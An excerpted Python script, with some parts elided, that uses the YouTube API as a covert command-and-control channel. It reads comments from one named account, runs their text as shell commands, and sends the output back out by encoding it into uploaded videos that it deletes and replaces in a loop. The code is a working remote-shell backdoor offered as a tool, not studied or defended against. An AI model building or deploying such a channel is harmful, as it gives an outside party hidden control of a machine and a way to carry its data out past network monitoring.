...
def get_authenticated_service():
    ...
    creds = Credentials.from_authorized_user_info(token_data, scopes=['https://www.googleapis.com/auth/youtube.force-ssl'])
...
def upload_video(file_path, title, description, category_id="22", privacy="public"):
    ...
    print("Video Link:", f"https://youtu.be/{video_id}")
    # time.sleep(20)
    return video_id

# Read comments
def read_comments(video_id):
    while 1:
        service = get_authenticated_service()
        ...
        for item in response.get("items", []):
            ...
            if "@mohamedshahat1817" in author:
                return comment

# Delete video
def delete_video(video_id):
    service = get_authenticated_service()
    request = service.videos().delete(id=video_id)
    request.execute()
...
if __name__ == "__main__":
    ...
    audio = "wawa.mp3"
    c = 1
    video_path = "skrillex_"+str(c)+"_output.mp4"  # Replace with your file
    create_video_with_message(audio, message, video_path)
    video_id = upload_video(video_path, "FIRST_c"+str(c)+"_shiky_Test Video", "Uploaded via API")
    os.system("rm "+video_path)
    time.sleep(60) # 1 minutes sleep
    # input("enter to con me :")

    while 1:
        command = read_comments(video_id)
        command = command.replace(" ","").replace("\n","")
        # input("enter to con me :")
        delete_video(video_id)
        c +=1
        if "stopme" in command:
            break
        else:
            output_command = subprocess.run(command, shell=True, capture_output=True, text=True).stdout
        video_path = "skrillex_"+str(c)+"_output.mp4"  # Replace with your file
        create_video_with_message(audio, output_command, video_path)
        video_id = upload_video(video_path, "FIRST_c"+str(c)+"_shiky_Test Video", "Uploaded via API")
        os.system("rm "+video_path)
